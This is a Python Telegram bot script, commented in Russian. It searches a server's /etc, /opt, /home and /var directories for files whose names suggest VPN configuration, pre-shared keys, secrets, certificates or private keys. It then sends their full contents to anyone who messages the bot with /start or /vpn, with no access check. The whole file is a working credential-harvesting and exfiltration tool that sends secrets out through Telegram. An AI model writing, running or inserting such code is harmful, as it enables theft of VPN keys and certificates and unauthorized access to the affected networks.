import telebot
import os

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("Нет TELEGRAM_BOT_TOKEN в окружении")

bot = telebot.TeleBot(TOKEN)

# Где и что ищем
SEARCH_DIRS = [
    "/etc",
    "/usr/local/etc",
    "/opt",
    "/home",
    "/var",
]

KEYWORDS = [
    "ipsec",
    "ike",
    "ikev2",
    "strongswan",
    "wireguard",
    "wg",
    "openvpn",
    "vpn",
    "psk",
    "secret",
    "cert",
    "key",
]

MAX_FILE_SIZE = 300_000  # чтобы не слать гигабайты


def looks_like_vpn(filename: str) -> bool:
    name = filename.lower()
    return any(k in name for k in KEYWORDS)


def scan_files():
    results = []

    for base in SEARCH_DIRS:
        for root, dirs, files in os.walk(base, topdown=True):
            # чуть ограничим глубину
            depth = root[len(base):].count(os.sep)
            if depth > 5:
                dirs[:] = []
                continue

            for file in files:
                path = os.path.join(root, file)

                if not looks_like_vpn(path):
                    continue

                try:
                    if not os.path.isfile(path):
                        continue
                    if not os.access(path, os.R_OK):
                        continue
                    if os.path.getsize(path) > MAX_FILE_SIZE:
                        continue

                    with open(path, "r", errors="ignore") as f:
                        content = f.read()

                    # минимальная проверка, что это не мусор
                    if any(k in content.lower() for k in KEYWORDS):
                        results.append((path, content))

                except Exception:
                    continue

    return results


@bot.message_handler(commands=["start", "vpn"])
def handle_vpn(message):
    bot.reply_to(message, "🔍 Ищу VPN‑данные на сервере… подожди.")

    results = scan_files()

    if not results:
        bot.send_message(
            message.chat.id,
            "❌ Ничего не найдено.\n"
            "Либо VPN нет, либо у бота нет прав читать конфиги."
        )
        return

    for path, content in results:
        text = f"📄 Файл: {path}\n\n{content}"
        # Telegram лимит ~4096 символов
        for i in range(0, len(text), 4000):
            bot.send_message(message.chat.id, text[i:i+4000])


bot.polling(none_stop=True)